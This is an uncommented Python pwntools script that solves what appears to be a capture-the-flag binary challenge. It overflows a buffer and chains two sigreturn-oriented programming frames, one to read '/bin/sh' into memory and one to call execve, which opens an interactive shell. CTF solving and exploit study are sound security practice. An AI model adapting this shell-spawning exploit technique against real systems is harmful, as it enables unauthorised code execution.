from parse_args_and_some_func import *

sh = all_parsed_args["io"]
context.update(arch="amd64", os="linux", endian="little")

# write /bin/sh on 0x402000
data_addr = 0x402000
syscall_leave_ret = 0x401033
pop_rax_syscall_leave_ret = 0x401032
syscall_addr = 0x401046
frame = SigreturnFrame(kernel="amd64")
frame.rax = 0 # read 
frame.rdi = 0 # stdin
frame.rsi = data_addr
frame.rdx = 0x400
frame.rip = syscall_leave_ret
frame.rbp = data_addr + 0x20
layout = [0x88 * "a", pop_rax_syscall_leave_ret, 0xf, bytes(frame)]
# srop to call read, set *data_addr = /bin/sh\x00
sh.sendlineafter("Hey, can i get some feedback for the CTF?\n", flat(layout))

# call execve /bin/sh
layout = ["/bin/sh\x00", "a" * 0x20, pop_rax_syscall_leave_ret, 0xf]
frame = SigreturnFrame(kernel="amd64")
frame.rax = 59 # execve 
frame.rdi = data_addr # stdin
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_addr
layout.append(bytes(frame))
sh.sendline(flat(layout))
sh.interactive()


